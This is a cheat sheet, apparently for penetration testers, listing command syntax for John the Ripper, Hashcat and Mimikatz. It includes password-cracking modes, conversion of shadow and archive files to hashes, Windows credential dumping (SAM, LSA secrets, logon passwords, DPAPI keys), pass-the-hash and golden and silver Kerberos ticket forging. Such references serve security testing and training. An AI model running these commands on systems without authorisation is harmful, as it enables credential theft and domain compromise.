John the RipperCPU-based password cracking
---- Common -----
[Cracker simple] — john hash.txt
[Wordlist] — john --wordlist=<wordlist> hash.txt
[Incremental mode] — john --incremental hash.txt
[Restore session] — john --restore
---- Hash Types -----
[Auto-detect] — john hash.txt
[MD5] — john --format=raw-md5 hash.txt
[SHA1] — john --format=raw-sha1 hash.txt
[NTLM] — john --format=NT hash.txt
[bcrypt] — john --format=bcrypt hash.txt
---- Password Lists -----
[Custom wordlist] — john --wordlist=custom.txt hash.txt
[Wordlist + rules] — john --wordlist=rockyou.txt --rules hash.txt
---- Rules -----
[Rules par défaut] — john --rules hash.txt
[Rules single] — john --single hash.txt
[Rules custom] — john --rules=KoreLogic hash.txt
---- Output / Results -----
[Voir les mots trouvés] — john --show hash.txt
[Voir les stats] — john --status
[Output dans fichier] — john hash.txt --pot=cracked.pot
---- Sessions -----
[Créer session] — john --session=mysession hash.txt
[Restaurer session] — john --restore=mysession
---- Performance -----
[Threads] — john --fork=4 hash.txt
[Disable AVX] — john --disable-avx hash.txt
---- Useful -----
[Convertir hash (unshadow)] — unshadow passwd shadow > hash.txt
[Convertir hash (zip2john)] — zip2john file.zip > hash.txt
[Convertir hash (rar2john)] — rar2john file.rar > hash.txt
[Convertir hash (pdf2john)] — pdf2john.pl file.pdf > hash.txt
---- Formats populaires -----
[ZIP] — john --format=zip hash.txt
[RAR] — john --format=rar hash.txt
[SSH private key] — john --format=ssh hash.txt
[KeePass] — john --format=keepass hash.txt
HashcatGPU-accelerated password cracking
---- Common -----
[Crack simple] — hashcat -m <mode> -a 0 hash.txt rockyou.txt
[Auto wordlist] — hashcat -m <mode> hash.txt rockyou.txt
[Show cracked] — hashcat -m <mode> hash.txt --show
---- Attack Modes -----
[Dictionary] — hashcat -m <mode> -a 0 hash.txt wordlist.txt
[Bruteforce] — hashcat -m <mode> -a 3 hash.txt '?a?a?a?a'
[Hybrid dict + mask] — hashcat -m <mode> -a 6 hash.txt wordlist.txt '?d?d'
[Hybrid mask + dict] — hashcat -m <mode> -a 7 hash.txt '?d?d' wordlist.txt
---- Hash Modes -----
[MD5] — hashcat -m 0 hash.txt rockyou.txt
[SHA1] — hashcat -m 100 hash.txt rockyou.txt
[NTLM] — hashcat -m 1000 hash.txt rockyou.txt
[bcrypt] — hashcat -m 3200 hash.txt rockyou.txt
[Kerberos 5] — hashcat -m 13100 hash.txt rockyou.txt
[Zip] — hashcat -m 13600 hash.txt rockyou.txt
[RAR3] — hashcat -m 12500 hash.txt rockyou.txt
---- Masks -----
[Lowercase 6 chars] — '?l?l?l?l?l?l'
[Digits 4 chars] — '?d?d?d?d'
[Mix 8 chars] — '?a?a?a?a?a?a?a?a'
---- Rules -----
[Rules par défaut] — hashcat -m <mode> -a 0 hash.txt wordlist.txt -r rules/best64.rule
[Rules combinées] — hashcat -m <mode> -a 0 hash.txt wordlist.txt -r rules/dive.rule
---- Performance -----
[Optimisation] — hashcat -O -m <mode> hash.txt rockyou.txt
[Limiter GPU] — hashcat --gpu-temp-abort=85 -m <mode> hash.txt rockyou.txt
[Force] — hashcat --force -m <mode> hash.txt rockyou.txt
---- Sessions -----
[Créer session] — hashcat -m <mode> -a 0 hash.txt rockyou.txt --session=myjob
[Restaurer session] — hashcat --restore=myjob
---- Output -----
[Potfile custom] — hashcat -m <mode> hash.txt rockyou.txt --potfile-path=my.pot
[Disable potfile] — hashcat -m <mode> hash.txt rockyou.txt --potfile-disable
---- Useful -----
[Benchmark] — hashcat -b
[List hash modes] — hashcat --help | grep "Hash modes"
[Convertir hash ZIP] — zip2john file.zip > hash.txt
[Convertir hash RAR] — rar2john file.rar > hash.txt
MimikatzDump credentials and tickets from Windows
---- Common -----
[Lancer mimikatz] — mimikatz.exe
[Mode admin] — privilege::debug
[Vérifier privilèges] — token::whoami
---- Credentials -----
[Dump logon passwords] — sekurlsa::logonpasswords
[Dump SAM] — lsadump::sam
[Dump LSA secrets] — lsadump::secrets
[Dump cached creds] — sekurlsa::cached
---- NTLM / Hashes -----
[Dump NTLM hash] — sekurlsa::msv
[Dump Kerberos tickets] — sekurlsa::kerberos
[Dump all creds] — sekurlsa::credman
---- Pass-The-Hash -----
[PTH (NTLM)] — sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<HASH> /run:cmd.exe
---- Pass-The-Ticket -----
[Lister tickets] — kerberos::list
[Exporter ticket] — kerberos::list /export
[Injecter ticket] — kerberos::ptt <ticket.kirbi>
---- Golden Ticket -----
[Créer Golden Ticket] — kerberos::golden /user:<USER> /domain:<DOMAIN> /sid:<SID> /krbtgt:<HASH> /id:500
[Injecter Golden Ticket] — kerberos::ptt <ticket.kirbi>
---- Silver Ticket -----
[Créer Silver Ticket] — kerberos::silver /domain:<DOMAIN> /sid:<SID> /target:<SPN> /rc4:<HASH>

[Dump DPAPI master keys] — dpapi::masterkey /system
